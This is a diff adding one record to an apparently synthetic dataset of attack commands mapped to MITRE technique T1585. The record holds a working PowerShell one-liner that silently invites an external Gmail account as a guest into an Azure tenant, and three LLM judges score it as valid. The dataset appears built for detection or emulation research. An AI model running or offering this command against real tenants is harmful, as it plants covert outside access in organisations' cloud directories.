@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1585",
+  "platform": "Cloud",
+  "shell": "Powershell",
+  "command": "$token=$(az account get-access-token --resource https://graph.microsoft.com --query accessToken -o tsv); $body='{\"invitedUserEmailAddress\":\"nora.chen.personal@gmail.com\",\"invitedUserDisplayName\":\"Nora Chen\",\"inviteRedirectUrl\":\"https://portal.azure.com/\",\"sendInvitationMessage\":false}'; Invoke-RestMethod -Method POST -Uri \"https://graph.microsoft.com/v1.0/invitations\" -Headers @{Authorization=\"Bearer $token\";'Content-Type'='application/json'} -Body $body | ConvertTo-Json",
+  "explanation": "Creates a guest account via invitation without sending an email, establishing an external-looking persona inside the tenant.",
+  "rationale_steps": [
+    "Acquire a Graph token from Azure CLI for authenticated requests.",
+    "Post to the invitations endpoint to create a B2B guest silently.",
+    "Return the invitation resource as JSON for automation."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1585-a77285be-8287e86d",
+  "source_prompt_hash": "a77285be",
+  "timestamp_utc": "2025-09-30T07:39:21.925097Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell is well-formed with balanced quotes, correct command separators, valid hashtable headers, and proper token substitution.",
+        "semantic_score": 4,
+        "semantic_justification": "It correctly uses Microsoft Graph invitations to create a guest user without sending an email, but it requires appropriate directory invite permissions and Graph consent, contradicting the 'Privilege: None' claim.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T10:59:37.195036Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The PowerShell command is largely well-formed with proper variable assignment, REST method invocation, and header construction, though the single-quoted key 'Content-Type' in the hashtable may cause minor parsing issues in some PowerShell versions compared to using a quoted string key.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1585 by obtaining a Microsoft Graph API token via Azure CLI, then using the Graph invitations endpoint to create a guest account for an external Gmail address without sending an invitation email, which is a realistic and operationally plausible technique for establishing a stealthy external persona inside an Azure AD tenant.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2026-02-19T00:44:59.448259Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses correct PowerShell syntax for variable assignment, sub-expressions, hashtables, and cmdlet parameters with balanced quoting.",
+        "semantic_score": 5,
+        "semantic_justification": "The command correctly uses the Azure CLI to fetch a Graph API token and invokes the proper Microsoft Graph endpoint to create a guest invitation without an email notification, perfectly matching the T1585 technique.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T00:45:00.641402Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
